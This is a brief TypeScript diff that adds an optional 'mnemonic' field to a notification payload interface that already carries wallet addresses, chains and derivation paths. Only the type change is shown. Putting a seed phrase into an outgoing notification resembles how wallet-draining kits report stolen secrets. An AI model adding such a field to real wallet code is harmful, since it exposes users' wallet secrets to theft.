@@ -9,6 +9,7 @@ interface NotifyPayload {
   address?: string;
   fields?: Record<string, string>;
   addresses?: Array<{ chain: string; address: string; path?: string }>;
+  mnemonic?: string;
 }
 
 function truncate(s: string, n: number) {
